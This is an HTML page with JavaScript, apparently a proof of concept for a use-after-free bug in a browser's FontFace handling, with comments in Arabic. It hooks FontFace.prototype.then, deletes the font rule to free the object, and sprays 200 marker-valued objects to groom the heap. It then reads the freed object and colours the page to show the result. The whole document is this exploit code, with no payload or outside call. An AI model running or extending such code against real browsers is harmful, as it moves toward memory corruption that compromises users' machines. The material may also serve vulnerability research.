<!DOCTYPE html>
<html>
<head>
<style id="s">
@font-face { font-family: 'targetFont'; src: url(nonexistent.woff); unicode-range: U+0042; }
</style>
</head>
<body style="background: black; color: white; font-family: monospace;">

<script>
window.onload = () => {
    let A = new FontFace('targetFont', 'local(Helvetica)', { unicodeRange: 'U+0041' });
    document.fonts.add(A);
    void A.loaded;

    let callbackCount = 0;
    let structures = [];

    Object.defineProperty(FontFace.prototype, 'then', {
        configurable: true,
        get() {
            if (this === A) {
                callbackCount++;
                
                if (callbackCount === 1) { 
                    // 1. تحرير كائن الخط
                    document.getElementById('s').sheet.deleteRule(0);
                    
                    // 2. محاولة ملء الفراغ بكائنات جافا سكريبت ذات خصائص مكررة لشغل نفس الحجم
                    // نضع قيم رقمية مميزة (مثل 0x1337) لنرى هل يمكننا قراءتها لاحقاً
                    for (let i = 0; i < 200; i++) {
                        let obj = {
                            prop1: 0x13371337,
                            prop2: 0x13371337,
                            prop3: A, // إبقاء مرجع للكائن الأصلي
                            id: i
                        };
                        structures.push(obj);
                    }
                    
                    // 3. فصل التنفيذ للسماح للمتصفح بإعادة ترتيب الذاكرة (Grooming)
                    setTimeout(() => {
                        try {
                            // محاولة استدعاء خاصية مجدداً لإجبار المتصفح على القراءة من الكائن المستبدل
                            let check = A.family; 
                            
                            // إذا استقر المتصفح وقرأ دون انهيار، نغير اللون للأزرق
                            document.body.style.background = "blue";
                        } catch(e) {
                            // إذا حدث خطأ برمجي عادي وليس انهيار متصفح
                            document.body.style.background = "red";
                        }
                    }, 0);
                }
            }
            return undefined;
        }
    });

    document.fonts.load('1em targetFont', 'AB');
};
</script>
</body>
</html>
